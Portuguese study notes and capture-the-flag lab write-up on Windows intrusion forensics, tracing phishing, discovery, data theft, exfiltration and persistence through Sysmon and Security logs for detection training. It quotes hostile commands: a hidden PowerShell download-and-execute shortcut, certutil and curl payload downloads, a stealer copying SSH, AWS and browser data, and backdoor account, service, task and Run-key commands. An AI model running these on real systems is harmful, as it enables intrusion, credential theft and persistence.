O primeiro passo de um atacante é conseguir acesso a um dispositivo e, para isso, ele irá procurar por serviços não supervisionados que o disponibilize acesso a outras partes do sistema, como diz as técnicas do MITR3: T1133 / External Remote Services (conseguir acesso remoto através de serviços com senhas fracas) e T1190 / Exploit Public-Facing Application (procurar acesso a websites e aplicações desconfiguradas ou vulneráveis). Entretanto o link mais fraco de toda a relação entre sistemas continua sendo o usuário, portanto o ataques mais comuns continuam sendo através de phishing e engenharia social. As técnicas definidas pelo MITR3 são: T1566 / Phishing (os atacantes induzem o usuário a executar um malware através de phishing) e T1091 / Removable Media (atacantes infectam dispositivos USB e esperam um usuário conectá-lo ao pc) .

Muitos dispositivos possuem o serviço RDP ativo e com segurança fraca e, portanto, provavelmente estão infectados. Com isso é muito interessante estar vigilante sobre a ativação e o uso desse serviço.

> Investigando
Investigando o arquivo “RDP-Security.evtx”, começo filtrando por eventos de falha (4625) resultando em 1567 eventos, filtro o tipo do evento para 3 e 10 que significam logons remotos e investigo por endereços IP suspeitos. Além disso, procuro pelo nome do usuário logado (WIN-F89VT9ITR10$) através do ID 4624, no caso a conta utilizada para conseguir o primeiro acesso.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Muitas extensões estão passando a serem bloqueadas porque atores de ameaça estão as utilizando para mascarar programas binários ou links para arquivos (LNK), como: 
<details>
  <summary>extensões</summary>
  com
exe
dll
ocx
ps1
ps1xml
ps2
ps2xml
psc1
psc2
msh
msh1
msh2
mshxml
msh1xml
msh2xml
js
jse
vbs
vb
vbe
cmd
bat
hta
inf
reg
pif
scr
cpl
scf
msc
pol
hlp
chm
ws
wsf
wsc
wsh
jar
rar
z
bz2
cab
gz
tar
ace
msi
msp
mst
msu
ppkg
bak
tmp
ost
pst
pkg
iso
img
vhd
vhdx
application
lock
lck
sln
cs
csproj
resx
config
resources
pdb
manifest
mp3
wma
doc
dot
wbk
xls
xlt
xlm
xla
ppt
pot
pps
ade
adp
mdb
cdb
mda
mdn
mdt
mdf
mde
ldb
wps
xlsb
xlam
xll
xlw
ppam
</details>

já que os sistemas operacionais geralmente escondem as extensões dos arquivos ficando difícil a percepção. Os agentes de ameaça utilizam a técnica indicada como “Masquerading: double file extension”, exemplo: file.txt.exe o que parecerá apenas um arquivo .txt (https://attack.mitre.org/techniques/T1036/007/)

Para evitar detecção por antivírus, atacantes utilizam shortcuts de arquivos LNK que podem parecer atalhos para programas legítimos, mas com um pouco de investigação é possível identificar um programa para powershell
> Investigando
Investigando uma pasta compactada com um arquivo png e um arquivo chamado “Official Website.lnk” (ou seja, um shortcut), descomprimindo a pasta é possível visualizar o alvo do shortcut como `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -c iex (iwr -UseBasicParsing "http://wp16.hqywlqpa.thm:8000/cgi-bin/f").Content` 

Investigando o arquivo de captura de log “Phishing-Sysmon.evtx”, é possível identificar que o arquivo “best-cat.jpg.exe”, ao ser executado, resultou no download da pasta “top-cats.zip” e que fora armazenado em “C:\Users\Administrator\Pictures” conforme visto no log. O PID associado é 5484 e o domínio acessado é “rjj.store” 

Um caso muito comum de infecção de malware ainda é por dispositivos USB como visto em: https://hackread.com/fbi-hackers-mail-malicious-usb-drives-ransomware/ e https://www.malwarebytes.com/blog/news/2025/05/malware-infected-printer-delivered-something-extra-to-windows-users

Após agentes de ameaça conseguirem acesso a um sistema, eles possuem duas opções: implantar um backdoor para persistência ou tomar medidas imediatas. Para isso precisam determinar o ambiente em que estão através da técnica de descoberta: https://attack.mitre.org/tactics/TA0007/ então alguns comandos comuns de observância são:
- `type <file>`, `Get-Content <file>`, `dir <folder>`, `Get-ChildItem <folder>`  → descoberta de arquivos e pastas
- `whoami`, `net user`, `net localgroup`, `query user`, `Get-LocalUser` → descoberta de usuários e grupos
- `tasklist /v`, `systeminfo`, `wmic product get name,version`, `Get-Service` → descoberta de sistema e aplicações
- `ipconfig /all`, `netstat -ano`, `netsh advfirewall show allprofiles` → descoberta de redes e suas configurações
- Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct” → descoberta de antivírus

Muitos ataques acontecem por cmd como em: editor BlackSuit Ransomware - The DFIR Report, porém eles são armazenados em logs, então é possível rastrear todos os passos de um agente de ameaça. Também podem invadir a GUI então terão ainda mais acesso assim como ao próprio CMD. 

> Investigando
Filtrar por criação de processos

Você recebeu um cenário de análise forense/malware. O objetivo é executar um anexo malicioso em uma VM e investigar o comportamento dele usando os logs do Sysmon.

O arquivo suspeito é: `C:\Users\Administrator\Desktop\Practice\Task 3\invoice.pdf.exe`

Esse nome já é clássico de phishing: ele tenta parecer um PDF legítimo (“invoice.pdf”), mas na verdade é um executável `.exe`.

Investigando através do task viewer, acesso a pasta do sysmon em “Applications and service logs/Windows/Sysmon”, observo que o primeiro comando executado após a execução do arquivo malicioso foi `whoami` , depois `cmd /c "systeminfo | findstr os"`  que extrai o sistema operacional. O arquivo então explora o arquivo de atualização do windows acessando `C:\Windows\servicing\TrustedInstaller.exe` , depois identifica o nome do fabricante da placa mãe do alvo, confere se há algum EDR com `cmd  /c "tasklist /v | findstr csfalconservice.exe || echo No CrowdStrike EDR"` procura por um processo csfalconservice.exe e imprime o echo caso o resultado seja false, e continua procurando por outros tipos de EDR como: `carbonsensor.exe` e `mssense.exe` . Por último, identifica o nome do host `powershell -c "ls C:\Users\*\Desktop\* | %%{Write-Host $_.FullName}", cria o arquivo PSScriptPolicyTest_huky0pfv.pw0.ps1 com dupla extensão  utilizando o comando:  `C:\Users\Administrator\AppData\Local\Temp\2\__PSScriptPolicyTest_huky0pfv.pw0.ps1` , após isso realizou duas queries dns para enviar os dados descobertos, “cluster.thmk8s.com” e “exfil.beecz.cafe”. 

Após a descoberta dos dados, um atacante irá filtrar quais os dados válidos e valiosos e, para isso, pode utilizar a combinação de 3 táticas: coleta, acesso a credenciais e exfiltração.
Pode coletar informações de drivers, browsers, áudio, vídeo e email através de câmeras, microfone e webcam, além de input de teclado.

Os alvos de roubo de dados costumam ser: `C:\Users\<user>\AppData\Roaming\Signal\*` e `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History` para chantagem com fotos, histórico de navegador e conversas; `C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat` e 
`C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies` para roubo de dinheiro; 
`C:\Users\<user>\.ssh\*` e `C:\Program Files\Microsoft SQL Server\...\DATA\*` para roubo de dados corporativos. 

Agentes de ameaça também podem coletar informações utilizando comandos simples como: type, notepad, copy, etc ou, mais comumente, utilizar programas próprios que dificultam a identificação do processo já que é um código próprio. Exemplo de caso: https://thedfirreport.com/2024/08/26/blacksuit-ransomware/#collection e informações sobre um algoritmo stealer: https://unit42.paloaltonetworks.com/new-malware-gremlin-stealer-for-sale-on-telegram/

> Investigando
Executando o “stealer.exe”, é possível identificar seus passo com o event viewer em que, após a sua execução, o programa começa com `cmd /c "mkdir %%temp%%\staging_58f1"` que cria uma pasta chamada literalmente “%%temp%%\staging_58f1” e copia o que estiver na área de transferência do usuário para o arquivo clipboard.txt com `powershell -c "Get-ClipBoard > $env:Temp\staging_58f1\clipboard.txt"` , depois faz `cmd /c "xcopy %%userprofile%%\.aws %%temp%%\staging_58f1\aws /i /y"`que copia a pasta inteira com os dados definindo o caminho alvo que, se não existir deve ser criada (/i) e confirmar tudo com /y. Rouba também chaves ssh `cmd /c "xcopy %%userprofile%%\.ssh %%temp%%\staging_58f1\ssh /i /y` , além de copiar também arquivos do word e seus subdiretórios (/s) com `cmd /c "xcopy %%userprofile%%\Desktop\*.docx %%temp%%\staging_58f1\desktop /i /s /y"` , pdfs `cmd /c "xcopy %%userprofile%%\Desktop\*.pdf %%temp%%\staging_58f1\desktop /i /s /y"` , xlsx `cmd /c "xcopy %%userprofile%%\Desktop\*.xlsx %%temp%%\staging_58f1\desktop /i /s /y”` , copia arquivos do usuário do google chrome `cmd /c xcopy "%%localappdata%%\Google\Chrome\User Data\Default" %%temp%%\staging_58f1\browser /i /y` e, por último, compacta a pasta com `powershell -c "Compress-Archive -Force -Path $env:Temp\staging_58f1 -DestinationPath $env:Temp\staging_58f1.zip"` . O atacante então utilizou um bucket de armazenamento da aws para transferir os arquivos exfiltrados

Para transferir os dados exfiltrados, atacantes podem utilizar várias técnicas, como ditas no MITR3: https://attack.mitre.org/techniques/T1105/

Abra o navegador browser na VM e navegue até a URL. Qual a flag de resposta? Abrindo o navegador e colocando a url, recebo: `THM{just_use_web_browser}` 

Depois, abra o CMD e faça o download do arquivo da mesma URL utilizando curl.exe. Qual a flag de resposta. Utilizando o comando `curl http://appsforfree.thm/trojan.exe` recebo a flag: `THM{curl_is_cool}` 

Continue no CMD e com a URL, mas agora utilizando o certutil.exe. Qual a flag de resposta? Utilizando o comando `certutil -urlcache -split -f http://appsforfree.thm/trojan.exe flag.txt` e analisando o arquivo flag.txt, recebo a flag: `THM{abusing_certutil}` 

Por último, faça o download do mesmo arquivo com PowerShell IWR. Qual a flag? Utilizando o comando `powershell -Command "iwr -Uri 'http://appsforfree.thm/trojan.exe' -OutFile 'arquivo.txt'"` executando via powershell para não abrir outro terminal. Analiso o arquivo gerado e consigo a flag `THM{power_of_powershell}`
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Após conseguir os dados, os atacantes focam também em conseguir persistência para futuros ataques. Geralmente, incluem o dispositivo infectado em redes de botnets, para espionagem ou para conseguir entrada em outros sistemas. Como nos casos:
Para isso, utilizam técnicas de comando e controle: Command and Control, Tactic TA0011 - Enterprise | MITRE ATT&…, muitas vezes nem é necessário porque podem utilizar o serviço de RDP, mas muitos escolhem iniciar uma sessão de conexão C2 geralmente um arquivo que vem no download do malware anterior e, como usuários podem acabar deletando o arquivo que atua como um espião, o atacante providencia um arquivo extra para manter a conexão.
Entretanto, como um usuário pode reinicializar o sistema ou um patch de update pode ser instalado, o atacante precisa ultrapassar essas barreiras e existem algumas técnicas para isso, como descrito no MITR3: https://attack.mitre.org/tactics/TA0003/

- Via RDP: para isso, cria-se um novo usuário e possibilita a entrada via RDP, através do gerenciador do computador ou pelo serviço `lusrmgr.msc` . Adicionando um usuário normal:
    - `net user "usuario_intruso" "senha" /add` → CMD
    - `New-LocalUser “usuario_intruso” -senha […]` → PowerShell
    
    Adicionando o usuário a um grupo privilegiado:
    
    - `net localgroup Administrators "usuario_intruso" /add` → CMD
    - `AddLocalGroupMember "Administrators" -member "usuario_intruso"` → PowerShell
<mark>Criação de usuários tem o ID 4720. Adicionar um usuário a um grupo privilegiado é 4732. Evento de modificação de senha tem o ID 4724.</mark>
Não é ideal se basear apenas no nome do usuário, é preciso identificar outros aspectos importantes sobre o comportamento exercido, como: frequência de login e quais os horários, qual endereço IP utilizado e quais atividades são exercidas por esse usuário normalmente. Além disso, também é interessante analisar qual grupo o usuário foi adicionado, os mais comuns sendo adminsitradores e usuários de remote desktop.

- Via Malware: como nem sempre é possível acessar via RDP, agentes de ameaça geralmente utilizam outros métodos como phishing ou USB e, por isso, utilizam um malware para instalar um backdoor. Duas técnicas muito utilizadas são criar um serviço windows ou agendar uma tarefa. Exemplos: `sc create "BadService" binpath= "C:\malware.exe" start= auto` e `schtasks /create /tn "BadTask" /tr "C:\malware.exe" /sc onstart /ru System`

Para identificar os serviços rodando é possível: identificar evento com ID 1 → `sc.exe create` que cria um serviço; evento com ID 4697 (evento de segurança) ou 7045 (evento de sistema). Também podem ser disfarçar de serviços legítimos, como: svchost.exe, então é interessante analisar o comportamento desses processos (svchost.exe [...] -s Schedule).

- Via startup: agentes de ameaça também podem escolher rodar programas quando um usuário específico utilizar uma máquina e para isso utilizam técnicas como adicionar malware à pasta de inicialização `copy C:\malware.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"` ou rodar chaves específicas `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v BadKey /t REG_SZ /d "C:\malware.exe"` . É fácil acessar a pasta de inicialização porque foi projetada para isso, geralmente se encontrando em: “`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` ”, além de que acabam tendo um explorer.exe como processo parente, tornando a detecção mais difícil. O ID de evento é 11

Persistência por run keys segue o mesmo processo de startup, mas ao invés de copiar o programa à pasta de appdata, é necessário criar uma chave nos registros do windows em “Run” e para acessá-los basta: `regedit.exe` , entrar na pasta `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` e visualizar eventos com ID 13

> Investigando C2
Investigando o arquivo de log “Sysmon.evtx”, vejo que o arquivo cria um novo arquivo em C:\Users\Administrator\Downloads\URGENT!\URGENT!.lnk e depois aciona o powershell C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe , adicionando o arquivo de persistência em C:\Users\Administrator\AppData\Roaming\update.exe . O malware então tentou uma conexão com um servidor web como visto no seguinte log:

```
User: THM-DFIR-VM-3\Administrator
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.10.248.212
SourceHostname: THM-DFIR-VM-3.eu-west-1.compute.internal
SourcePort: 49739
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 10.14.97.15
DestinationHostname: ip-10-14-97-15.eu-west-1.compute.internal
DestinationPort: 80
DestinationPortName: http
```

Depois chamou o update.exe novamente "C:\Users\Administrator\AppData\Roaming\update.exe" e tenta uma conexão com o domínio route.m365officesync.workers.dev que se passa por legítimo, mas workers.dev é um subdomínio da cloudfare, mas a query está vazia retornando o código 9003. Isso pode indicar um Command and Control (C2) já que atacantes utilizam muito hospedagens de infraestruturas na clouflare.

> Investigando - persistência
Seguindo para o arquivo “Security.evtx” da pasta Task 3, descubro que primeiro o arquivo vai limpar os eventos de auditoria (1102), depois há vários logs de logon (4624 - sucesso e 4625 - falha). A primeira tentativa de logon foi bem sucedida pelo `NT AUTHORITY\SYSTEM` , mas foi do tipo 5 que indica um serviço do windows, o que pode indicar um evento normal do sistema. Após isso, há 6 eventos de logon de falha, do tipo 3 - aconteceu através da rede com o mesmo endereço IP que instalou o arquivo de persistência anteriormente “10.14.97.15”.

Após isso, houve um evento 4611 que indica que um processo de logon confiável foi registrado no registro de segurança. Esse evento ocorre na inicialização do sistema ou quando um usuário faz login. Depois, novamente um logon como “Administrador” com credenciais explícitas (ID 4648) pelo IP 10.14.97.15 do tipo 10 que indica logon interativo remoto via RDP (ID 4624) o que dá acesso à GUI do sistema, mouse e teclado.

Então, com acesso ao sistema, o atacante tentou enumerar os grupos de segurança disponíveis no sistema, no caso, o grupo “Administrators”:
<details>
  <summary>log</summary>
  A security-enabled local group membership was enumerated.

Subject:
Security ID:		SYSTEM
Account Name:		THM-DFIR-VM-3$
Account Domain:		WORKGROUP
Logon ID:		0x3E7

Group:
Security ID:		BUILTIN\Administrators
Group Name:		Administrators
Group Domain:		Builtin

Process Information:
Process ID:		0x4d0
Process Name:		C:\Windows\System32\svchost.exe
</details>

Criou um novo usuário normal chamado “support” (ID 4728 e ID 4720) e a ativou (ID 4722). Utilizou a conta Administrador para alterar a senha da conta support de forma que nunca expire 0x210, ou seja, que seja uma conta normal do windows. Ele alterou a flag “Old UAC Value” de 0x15 para 0x10 que remove as flags temporárias de alteração 0x01 e 0x04 e adicionou o usuário ao grupo de usuários (ID 4732) e, por último, ao grupo de administradores: 
<details>
  <summary>log</summary>
  A member was added to a security-enabled local group.

Subject:
Security ID:		THM-DFIR-VM-3\Administrator
Account Name:		Administrator
Account Domain:		THM-DFIR-VM-3
Logon ID:		0x1CBC41

Member:
Security ID:		THM-DFIR-VM-3\support
Account Name:		-

Group:
Security ID:		BUILTIN\Administrators
Group Name:		Administrators
Group Domain:		Builtin

Additional Information:
Privileges:		-
</details>

> Investigando Sysmon logs
Após a adição de um novo usuário o invasor deixou dois backdoors no sistema e o reiniciou. O próprio sistema instalou uma atualização, como visto no log que o autor foi LocalSystem: Após isso o sistema (NT AUTHORITY\SYSTEM) criou uma tarefa agendada chamada “AmazonSync” (ID 4698) e, após as atualizações do sistema, descubro que o atacante, agora como administrador, fez o download de um arquivo chamado “troy.exe” e “nessie.exe” (este na pasta de help que não recebe arquivos executáveis - foi utilizado o programa falso “data protection service”) com tipo 2 para que inicialize sozinho, especificando o argumento <IdleSettings> para que o arquivo fique inativo quando o usuário estiver utilizando o dispositivo por pelo menos uma hora (PT1H) e quando o usuário não estiver utilizando para que realize as atividades maliciosas por pelo menos 10 minutos (PT10M). Para isso, ele utiliza a regra `<StopOnIdleEnd>true</StopOnIdleEnd>` que interrompe a execução do programa quando o usuário utiliza o computador e não seja identificado no gerenciador de tarefas por possíveis problemas de desempenho. Executo o arquivo troy.exe para conferir seu funcionamento e me deparo com a pergunta: 

`Not so fast! What was my parent commandline?                                                      Example: C:\Windows\System32\os.exe -run`

Com um pouco de pesquisa, descubro que o comando: `Get-CimInstance Win32_Process -Filter "Name='troy.exe'" | Select-Object Name, ProcessID, ParentProcessID` no powershell, resgata informações sobre um processo como ID, o parente e nome. O resultado é: ProcessID = 5440 e ParentProcessID = 4628. Filtro então só pelo processo 4628 com `Get-Process -Id 4628` que me retorna:
```
PS C:\Users\Administrator> Get-Process -Id 4628   
                                                                                                                                                                                              
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                      
-------  ------    -----      -----     ------     --  -- -----------                                                      
1892      84       36424     114368      14.19   4628   2 explorer
```
<details>
  <summary>log</summary>
  A service was installed in the system.

Subject:
	Security ID:		THM-DFIR-VM-3\Administrator
	Account Name:		Administrator
	Account Domain:		THM-DFIR-VM-3
	Logon ID:		0x3D349

Service Information:
	Service Name: 		GoogleUpdaterInternalService138.0.7156.0
	Service File Name:	"C:\Program Files (x86)\Google\GoogleUpdater\138.0.7156.0\updater.exe" --system --windows-service --service=update-internal
	Service Type: 		0x10
	Service Start Type:	2
	Service Account: 		LocalSystem
</details>

Com isso, posso utilizar o comando: PS C:\Users\Administrator> Get-CimInstance Win32_Process -Filter "ProcessId=4628" | Select-Object Name, ExecutablePath que retorna o nome e caminho do processo 4628 pai, no caso:
```
Name         ExecutablePath                                                                                             
----         --------------                                                                                             
explorer.exe C:\Windows\Explorer.EXE
```
Tento fazer o mesmo com o processo Explorer, mas não dá certo porque o processo já foi executado e, com isso, preciso procurar pelo sysmon. Posso utilizar o seguinte comando Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$.Id -eq 1 -and $.Message -match "ProcessId: 4540"} | Select-Object -Property Message | Format-List que procura pelo histórico de segurança do windows (abro o histórico do sysmon, em que o ID é 1 - process creation e o id do processo é 4540, filtro pelas mensagens em formato de lista) e obtenho: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule e o programa troy.exe me retorna a flag: THM{c2_is_on_schedule!} 

> Investigando - backdoors
Há dois arquivos: “Sysmon (Before reboot).evtx” e “Sysmon (After reboot).evtx”. Começando com o antes do reboot, noto que o processo 3192 abre um processo de terminal “cmd” em: 2025-07-04 22:05:48.439, depois esse processo cria um arquivo foi criado chamado “odin.cmd” (log1). Um detalhe interessante é a regra de persistência (TA0003) do MITR3 associada “RuleName: T1023” - Modificação de atalhos. Após, o programa utiliza o usuário atual para abrir um processo do chrome (log2) e uma dns query cujo nome é wpad, que é um mecanismo da web de busca por configurações de proxy na rede. 
Foram observadas consultas DNS para wpad, relacionadas ao mecanismo de descoberta automática de proxy do Windows, executado pelo serviço WinHttpAutoProxySvc. Posteriormente foi identificada uma consulta ao domínio onecs-live.azureedge.net, pertencente à infraestrutura Microsoft Azure, normalmente associada a serviços legítimos do sistema operacional, incluindo telemetria e comunicação com serviços Microsoft. (log3)
Também foi identificado o uso do utilitário reg.exe para adicionar o valor Basket na chave HKCU\Software\Microsoft\Windows\CurrentVersion\Run. O valor criado referencia o executável C:\Users\Public\kitten.exe, configurando sua execução automática durante o logon do usuário. O evento foi originado por um processo cmd.exe previamente observado criando o arquivo odin.cmd na pasta Startup, indicando múltiplos mecanismos de persistência no sistema. (log4)
Por último a confirmação da adição do valor Basket, mais um mecanismo de persistência, com o arquivo C:\Users\Public\kitten.exe. (log5). Rodando o arquivo kitten.exe pede o nome da run key que corresponde a Basket indicado pelo /v em: CommandLine: reg  add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Basket /t REG_SZ /d "C:\Users\Public\kitten.exe"
<details>
  <summary>logs</summary>
  <details>
    <summary>log1</summary>
    File created:
    <mark>RuleName: T1023</mark>
    UtcTime: 2025-07-04 22:07:27.017
    ProcessGuid: {c5d2b969-503c-6868-1e01-000000001c01}
    ProcessId: 3192
    <mark>Image: C:\Windows\system32\cmd.exe</mark>
    <mark>TargetFilename: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\odin.cmd</mark>
    CreationUtcTime: 2025-07-04 22:07:27.017
    User: THM-DFIR-VM-3\Administrator <- autor
  </details>
  <details>
        <summary>log2</summary>
    Process Create:
    RuleName: -
    UtcTime: 2025-07-04 22:08:48.349
    ProcessGuid: {c5d2b969-50f0-6868-1f01-000000001c01}
    ProcessId: 3540
    Image: C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
    FileVersion: 138.0.7204.97
    Description: Google Chrome
    Product: Google Chrome
    Company: Google LLC
    OriginalFileName: chrome.exe
    <mark>CommandLine: "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"</mark>
    CurrentDirectory: C:\Program Files (x86)\Google\Chrome\Application\
    <mark>User: THM-DFIR-VM-3\Administrator <- usuário utilizado</mark>
    LogonGuid: {c5d2b969-45fb-6868-863d-040000000000}
    LogonId: 0x43D86
    TerminalSessionId: 2
    IntegrityLevel: High
    Hashes: MD5=DA34CEDC55D9BB00B3F372B4E16F5E8E,SHA256=CDCD09999ABA6E5583C053D1F1CBB86EEEA461C7865804563A2260BF00C32924,IMPHASH=57CF2C2757B740BE87F27FA95D3EC8C5
    ParentProcessGuid: {c5d2b969-45ff-6868-8b00-000000001c01}
    ParentProcessId: 4480
    ParentImage: C:\Windows\explorer.exe
    ParentCommandLine: C:\Windows\Explorer.EXE
    ParentUser: THM-DFIR-VM-3\Administrator 
  </details>
  <details>
        <summary>log3</summary>
    CommandLine: C:\Windows\System32\Speech_OneCore\Common\SpeechRuntime.exe -Embedding 
    ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
     
    CommandLine: C:\Windows\system32\svchost.exe -k WbioSvcGroup -s WbioSrvc
    ParentCommandLine: C:\Windows\system32\services.exe
    
    CommandLine: C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc 
    ParentCommandLine: C:\Windows\system32\services.exe
    QueryName: onecs-live.azureedge.ne
  </details>
  <details>
    <summary>log4</summary>
    HKCU\Software\Microsoft\Windows\CurrentVersion\Run

    Basket = C:\Users\Public\kitten.exe
  </details>
  <details>
    <summary>log5</summary>
    Registry value set:
    <mark>RuleName: T1060,RunKey -> detecção de chave de inicialização no registro do windows</mark>
    EventType: SetValue
    UtcTime: 2025-07-04 22:09:47.409
    ProcessGuid: {c5d2b969-5128-6868-3501-000000001c01}
    ProcessId: 5200
    Image: C:\Windows\system32\reg.exe
    <mark>TargetObject: HKU\S-1-5-21-1966530601-3185510712-10604624-500\Software\Microsoft\Windows\CurrentVersion\Run\Basket</mark>
    <mark>Details: C:\Users\Public\kitten.exe -> conteúdo da adição</mark>
    User: THM-DFIR-VM-3\Administrator
  </details>
</details>
